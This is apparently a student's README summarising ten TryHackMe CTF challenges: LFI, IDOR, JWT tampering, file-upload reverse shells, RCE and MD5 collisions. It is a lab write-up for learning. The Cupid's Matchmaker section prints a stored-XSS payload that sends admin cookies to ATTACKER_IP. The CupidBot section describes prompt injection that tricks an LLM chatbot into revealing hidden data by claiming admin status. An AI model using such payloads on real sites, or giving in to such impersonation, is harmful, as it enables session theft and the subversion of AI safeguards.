# Love at First Breach CTF Series - Complete

A comprehensive collection of penetration testing challenges from the TryHackMe "Love at First Breach" series. Each challenge demonstrates different vulnerability types, exploitation techniques, and security assessment methodologies.

---

## 📋 Series Overview

**Platform:** TryHackMe  
**Series:** Love at First Breach  
**Focus Areas:** Web Security, Data Exposure, RCE, Privilege Escalation, Authentication, Cryptography  
**Total Challenges:** 10 ✅

---

## 🎯 All Challenges

### 1. DeepIntoMyHeart

**Difficulty:** Easy  
**Vulnerabilities:** Exposed Credentials in Plain Sight  
**Status:** ✅ Complete  

**Quick Summary:**
- Discovered exposed authentication credentials
- Found sensitive data in robots.txt
- Gained unauthorized access to admin panel
- Retrieved user and system flags

**Key Learnings:**
- Importance of security headers
- Common data exposure locations
- Reconnaissance best practices
- Credential management security

---

### 2. CupidBot

**Difficulty:** Easy  
**Vulnerabilities:** Prompt Injection via Role Impersonation  
**Status:** ✅ Complete  

**Quick Summary:**
- Exploited prompt injection vulnerability in AI chatbot
- Bypassed authorization through social engineering (claimed admin status)
- Extracted 3 hidden flags by role impersonation
- Demonstrated how LLMs trust unverified user claims

**Key Learnings:**
- Prompt injection techniques against LLMs
- Authorization bypass via social engineering
- Importance of identity verification
- AI system security principles
- How system prompts can be exploited

---

### 3. TryHeartMe

**Difficulty:** Easy  
**Vulnerabilities:** JWT Token Manipulation / Privilege Escalation  
**Status:** ✅ Complete  

**Quick Summary:**
- Identified JWT-based authentication mechanism
- Extracted and decoded JWT token from browser storage
- Modified JWT claims (user→admin, credit→9999999)
- Replaced token to gain unauthorized admin access
- Retrieved flag from admin panel

**Key Learnings:**
- JWT structure and payload decoding
- Token-based privilege escalation
- Importance of signature verification
- Role-based access control implementation
- Backend validation of token claims

---

### 4. SpeedChat

**Difficulty:** Easy  
**Vulnerabilities:** Unrestricted File Upload with Code Execution  
**Status:** ✅ Complete  

**Quick Summary:**
- Discovered unrestricted file upload endpoint with no validation
- Uploaded Python reverse shell script to Flask application
- Achieved remote code execution as root user
- Established interactive reverse shell via netcat
- Retrieved flag via command execution
- Time to compromise: ~30 minutes

**Key Learnings:**
- Match reverse shell payload language to backend technology
- Difference between command-based and interactive reverse shells
- Interactive shells are more reliable and stable
- File upload RCE is quick to exploit when validation is missing
- Never trust file upload without strict validation

**CVSS Score:** 9.8 CRITICAL

---

### 5. ValenFind

**Difficulty:** Medium  
**Vulnerabilities:** Local File Inclusion (LFI)  
**Status:** ✅ Complete  

**Quick Summary:**
- Identified LFI vulnerability in file parameter
- Exploited to read sensitive system files
- Demonstrated path traversal techniques
- Retrieved flags via arbitrary file access

**Key Learnings:**
- How LFI differs from RFI
- Path traversal bypass techniques
- Encoding methods to evade filters
- Log file poisoning for RCE

---

### 6. Love Letter Locker

**Difficulty:** Easy  
**Vulnerabilities:** IDOR (Insecure Direct Object Reference)  
**Status:** ✅ Complete  

**Quick Summary:**
- Discovered message at `/letter/3` after registration
- URL revealed sequential letter numbering system
- Identified IDOR vulnerability: no authorization on `/letter/{id}`
- Successfully retrieved flags by enumerating letter IDs
- Accessed other users' private letters via ID manipulation

**Exploitation Process:**
```
1. Register account → assigned letter ID
2. Navigate to /letter/3 (random letter)
3. Discover sequential ID system
4. Enumerate: /letter/1, /letter/2, /letter/4, etc.
5. No authorization checks → all letters accessible
6. Flag retrieved from accessible letter
```

**Key Learnings:**
- Sequential numeric IDs are highly predictable
- Always check authorization on object access
- IDOR vulnerabilities are often overlooked
- Missing authorization checks > complex encryption
- Test with ID enumeration: 0, 1, 2, negative, UUIDs

**CVSS Score:** 7.5 (HIGH)

---

### 7. Cupid's Matchmaker

**Difficulty:** Easy  
**Vulnerabilities:** Stored XSS + Cookie Exfiltration  
**Status:** ✅ Complete  

**Quick Summary:**
An online dating/matchmaking application with a survey form. Discovered that user inputs are displayed without HTML escaping when admins view submissions. Exploited via Stored XSS payload that executes in admin's browser context.

**Attack Chain:**
```
1. Survey Form → Accept User Input (name, responses, text fields)
2. NO Input Validation → HTML/JavaScript not escaped
3. Admin Views Submissions → Payload stored in database
4. JavaScript Executes in Admin's Browser → Has authentication cookie
5. Fetch Request → Send cookie to attacker's server
6. Cookie Contains Flag Data → Base64 encoded
7. Decode → Flag Retrieved
```

**Exploitation Steps:**
```bash
# 1. Start listener on attacker machine
python3 -m http.server 8000

# 2. Submit malicious payload in survey form
# Payload: <script>fetch('http://ATTACKER_IP:8000/?cookie=' + btoa(document.cookie));</script>

# 3. Wait for admin to view submission
# Admin's browser executes JavaScript (in context of admin user)

# 4. Listener receives request with base64-encoded cookie
# GET /?cookie=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlRoYW5rIHlvdSEi...

# 5. Decode base64 cookie
echo "eyJfZmxhc2hlcyI6[...]" | base64 -d

# 6. Retrieve flag from cookie data
```

**Key Learnings:**
- **Real humans review submissions** = trusted user will execute your payload
- Stored XSS is more dangerous than Reflected XSS (affects admins)
- HTML escaping is critical for user-generated content
- Session cookies often contain sensitive data
- httpOnly flag on cookies prevents JavaScript access (but not network exfiltration)
- Base64 encoding is NOT encryption
- Listen before payload submission (confirms receipt)
- Admin panels are prime attack surfaces

**Vulnerability Chain:**
1. **Input Validation Missing** → No escaping of HTML/JavaScript
2. **Output Encoding Missing** → User data displayed as HTML
3. **Trust Assumption** → Admin trusted to review submissions safely
4. **Cookie Content** → Flag stored in response/session data

**CVSS Score:** 8.8 (HIGH)

---

### 8. Romance and Co.

**Difficulty:** Medium  
**Vulnerabilities:** 
- CVE-2025-55182 (React Server Components RCE)
- Privilege Escalation via Sudo Misconfiguration  
**Status:** ✅ Complete  

**Quick Summary:**
- Exploited Flight protocol deserialization vulnerability
- Achieved unauthenticated RCE as application user
- Escalated privileges via Python sudo abuse
- Complete system compromise (root access) achieved
- Time to compromise: ~150 minutes

**Key Learnings:**
- React Server Components security
- Insecure deserialization risks
- Automated tool efficiency (nuclei)
- Post-exploitation privilege escalation
- Python in sudoers is dangerous

**CVSS Score:** 9.8 CRITICAL

---

### 9. Signed Messages ⭐

**Difficulty:** 🟡 Medium  
**Category:** Web Security, Cryptography, Authentication  
**Vulnerabilities:**
- Passwordless authentication (no password required)
- Predictable cryptographic seeds (RSA key generation)
- Information disclosure via debug endpoint
**Status:** ✅ Complete

**Quick Summary:**
Discovered multiple cryptographic weaknesses in a "Love Note" application. Exploited passwordless authentication to access admin accounts, then leveraged a publicly accessible debug endpoint that revealed the RSA key generation algorithm. Reconstructed the admin's private key using the predictable seed pattern and forged valid digital signatures. Demonstrates how multiple "small" vulnerabilities chain into complete system compromise.

**Key Learnings:**
- Never use predictable data for cryptographic seeds
- Passwords are fundamental (authentication without them is worthless)
- Debug endpoints leak sensitive architectural information
- Digital signatures are only as secure as their keys
- Multiple weak controls compound into critical compromise
- Defense in depth matters: every layer must be secure

**CVSS Score:** 9.8 (CRITICAL)

---

### 10. When Hearts Collide (DogMatcher) 🔥

**Difficulty:** 🟡 Medium  
**Category:** Web Security, Cryptography  
**Vulnerabilities:** MD5 Hash Collision Attack  
**Status:** ✅ Complete  

**Quick Summary:**
A dog photo matching application that demonstrates the critical vulnerability of relying on cryptographically broken algorithms for security decisions. The app implements two checks:
1. Compare uploaded photo's MD5 hash to database dogs
2. Detect and reject exact duplicates by binary content

Both checks relied on MD5 hashing, which allowed exploitation through practical hash collision attacks. Using the `fastcoll` tool, generated two files with identical MD5 hashes but different binary content, bypassing both security layers simultaneously.

**Exploitation Timeline:**
- Reconnaissance: 10 minutes (identified endpoints, app behavior)
- Analysis: 5 minutes (understood dual-check mechanism)
- Tool Setup: 5 minutes (installed fastcoll with boost libraries)
- Collision Generation: 2 minutes (created matching MD5 files)
- Exploitation: <1 minute (uploaded collision file)
- **Total: ~25 minutes to flag**

**Attack Chain:**
```
Homepage Dog Image
    ↓
Download featured dog
    ↓
Direct upload → FAILS (duplicate detection)
    ↓
Research MD5 weaknesses
    ↓
Install fastcoll collision tool
    ↓
Generate collision: same MD5, different binary
    ↓
Upload collision file → PASSES both checks
    ↓
🚩 FLAG OBTAINED
```

**The Vulnerability:**
| Check | Original Dog | Collision File | Result |
|-------|-------------|----------------|--------|
| MD5 Hash | `a15ec1ec...` | `a15ec1ec...` | ✅ MATCH |
| Binary Content | Original bytes | Different bytes | ✅ DIFFERENT |
| Duplicate Detection | Triggers | Bypassed | ✅ BYPASSED |

**Why This Works:**
MD5 collisions allow generating two files with:
- Identical cryptographic hash
- Completely different binary content

This defeats both security checks that relied on MD5.

**Key Learnings:**
- **MD5 is cryptographically broken** since 2004
- **Collision attacks are practical** with modern tools
- **Single algorithm for multiple checks** = single point of failure
- **Defense in depth fails** when every layer uses the same weak component
- Never use MD5 for any security decision (matching, verification, deduplication)
- Use SHA-256 or SHA-3 for cryptographic operations
- Combine hash verification with independent file validation

**CVSS Score:** 8.7 (HIGH)  
**CWE:** CWE-327 (Use of Broken Cryptography)

---

## 🛠️ Tools & Techniques Used Across Series

**Reconnaissance:**
- nmap (network scanning)
- gobuster/ffuf (directory enumeration)
- nuclei (vulnerability scanning)
- curl/wget (manual probing)
- Browser DevTools (token extraction, cookie inspection)

**Exploitation:**
- Python scripting (custom exploits)
- react2shell (RCE delivery)
- netcat (reverse shells)
- jwt.io (JWT decoding/manipulation)
- fastcoll (MD5 collision generation)
- Manual vulnerability testing
- Prompt injection (social engineering)
- File upload exploitation
- Cryptography library (RSA key reconstruction)
- HTTP listeners (python3 -m http.server)
- XSS payload crafting (stored XSS, fetch exfiltration)

**Privilege Escalation:**
- sudo enumeration (`sudo -l`)
- SUID binary analysis
- Kernel exploit research
- Service misconfiguration abuse
- Token claim manipulation

**Cryptographic Attacks:**
- MD5 collision generation (fastcoll)
- Private key reconstruction (RSA)
- Signature forgery (digital signatures)
- Predictable seed exploitation
- Hash comparison attacks

**Reverse Shell Development:**
- Socket programming (Python)
- File descriptor redirection (os.dup2)
- Interactive bash shells
- Netcat listeners

---

## 📁 Repository Structure
```
love-at-first-breach/
├── README.md (series overview - this file)
├── 01_DeepIntoMyHeart/
│ ├── README.md
│ ├── REPORT.md
│ └── WALKTHROUGH.md
├── 02_CupidBot/
│ ├── README.md
│ └── WALKTHROUGH.md
├── 03_TryHeartMe/
│ ├── README.md
│ ├── REPORT.md
│ └── WALKTHROUGH.md
├── 04_SpeedChat/
│ ├── README.md
│ ├── PENTEST_REPORT.md
│ ├── WALKTHROUGH.md
├── 05_ValenFind/
│ ├── README.md
│ ├── REPORT.md
│ └── WALKTHROUGH.md
├── 06_Love_Letter_Locker/
│ ├── README.md
│ ├── WALKTHROUGH.md
├── 07_Cupids_Matchmaker/
│ ├── README.md
│ ├── WALKTHROUGH.md
├── 08_Romance_and_Co/
│ ├── README.md
│ ├── REPORT.md
│ └── WALKTHROUGH.md
├── 09_Signed_Messages/
│ ├── README.md
│ ├── WALKTHROUGH.md
│ ├── PENTEST_REPORT.md
└── 10_When_Hearts_Collide/
  ├── README.md
  ├── WALKTHROUGH.md
```

---

## 🎓 Skills Demonstrated

### Web Security
✅ Local File Inclusion (LFI) exploitation  
✅ Path traversal techniques  
✅ Secure deserialization practices  
✅ API security assessment  
✅ Input validation bypass  
✅ Prompt injection against LLMs  
✅ JWT manipulation and privilege escalation  
✅ Unrestricted file upload exploitation  
✅ Remote code execution delivery  
✅ **Stored XSS + Cookie Exfiltration**  
✅ **IDOR (Insecure Direct Object Reference)**  

### Authentication & Authorization
✅ JWT token structure and implementation  
✅ Signature verification requirements  
✅ Role-based access control (RBAC)  
✅ Token claim validation  
✅ Backend authentication checks  
✅ Passwordless authentication exploitation  
✅ **IDOR vulnerability exploitation**  

### Cryptography
✅ RSA cryptography fundamentals  
✅ Digital signature generation and verification  
✅ Key generation and derivation  
✅ Predictable seed identification  
✅ Private key reconstruction  
✅ Hash functions (SHA256, MD5)  
✅ Modular arithmetic and number theory  
✅ **MD5 collision attacks (fastcoll)**  
✅ **Cryptographic algorithm comparison (SHA vs MD5)**  

### Reconnaissance & Enumeration
✅ Network scanning (nmap)  
✅ Directory brute-forcing (gobuster, ffuf)  
✅ Automated vulnerability detection (nuclei)  
✅ Manual web application testing  
✅ Source code analysis  
✅ Storage inspection and token extraction  
✅ **ID enumeration techniques**  
✅ **Cookie analysis and inspection**  

### Exploitation & Post-Exploitation
✅ Remote Code Execution (RCE) delivery  
✅ Reverse shell establishment  
✅ Interactive shell development (Python sockets)  
✅ Privilege escalation techniques  
✅ Post-exploitation persistence  
✅ Flag retrieval and documentation  
✅ Social engineering against AI systems  
✅ Token manipulation and claim modification  
✅ File upload RCE exploitation  
✅ **Hash collision generation and exploitation**  
✅ **Stored XSS payload crafting**  
✅ **Cookie exfiltration via fetch()**  

### Documentation & Reporting
✅ Professional penetration testing reports  
✅ CVSS score assessment  
✅ Detailed technical walkthroughs  
✅ Remediation recommendations  
✅ Lessons learned analysis  
✅ **Cryptographic vulnerability analysis**  

---

## 📈 Learning Progression

**Phase 1: Fundamentals (Easy Challenges - Challenges 1-4)**
- DeepIntoMyHeart: Reconnaissance and information gathering
- CupidBot: Social engineering and AI security
- TryHeartMe: Token manipulation and authentication bypass
- SpeedChat: File upload exploitation and reverse shells

**Phase 2: Authorization & Access Control (Easy/Medium - Challenges 5-7)**
- ValenFind: File inclusion and path traversal
- Love Letter Locker: IDOR enumeration and authorization bypass
- Cupid's Matchmaker: Stored XSS and data exfiltration

**Phase 3: Advanced Exploits (Medium - Challenges 8-10)**
- Romance and Co.: Automated scanning and advanced RCE
- Signed Messages: Cryptography attacks and key reconstruction
- When Hearts Collide: Practical hash collision attacks

---

## 🔑 Key Takeaways Across Series

1. **Reconnaissance is Critical** - Detailed recon saves exploitation time
2. **Automate Where Possible** - Tools like nuclei and ffuf speed up enumeration
3. **Defense in Depth Fails** - Combination of multiple weaknesses = total compromise
4. **Privilege Escalation Vectors** - sudo, SUID, kernel vulns, and token manipulation are common
5. **Documentation Matters** - Professional reports are as important as technical skills
6. **Social Engineering Works** - Even AI systems can be fooled by authority claims
7. **Never Trust User Input** - Especially for authentication and authorization
8. **Match Payload Language to Backend** - Python shells for Python, bash for Linux
9. **Interactive Shells are Better** - More reliable than command-based shells
10. **Always Validate File Uploads** - Use magic bytes + library verification
11. **AI Security = Application Security** - Same principles apply to LLM-based systems
12. **Always Verify Cryptographic Signatures** - JWTs must validate with server secret
13. **🔴 NEVER USE MD5 FOR SECURITY** - Collision attacks are practical and effective
14. **Single Algorithm Risk** - Using same algo for multiple checks = single point of failure
15. **Defense in Depth Requires Diversity** - Each security layer should be independent
16. **Hash Functions Are Not Equal** - MD5 broken, SHA-256 secure (for now)
17. **IDOR is Often Overlooked** - Test ID enumeration and authorization independently
18. **HTML Escaping is Fundamental** - Unescaped user input = XSS vulnerability
19. **Real Humans Review Content** - Stored XSS affects trusted users (admins)
20. **Cookies Can Be Exfiltrated** - httpOnly prevents JavaScript, but not network requests

---

## 🤝 Disclaimer

All challenges were completed as part of authorized CTF assessments on TryHackMe. The techniques and tools described are for **educational and authorized testing purposes only**. Unauthorized access to computer systems is illegal.

---

## ✍️ Author

**Bishal Kumar Baishya**
Cybersecurity Student | Penetration Testing Focus

**GitHub/Portfolio:** [GitHub Link](https://github.com/Bishal-Kumar-Baishya)  
**LinkedIn:** [Profile](https://www.linkedin.com/in/bishal-kumar-baishya-022b56412/)

---

## 📄 License

Educational purposes only. All documentation and findings are available for security professionals and students.

---

**Last Updated:** October 7, 2026  
**Total Challenges Completed:** 10/10 ✅  
**Series Status:** COMPLETE 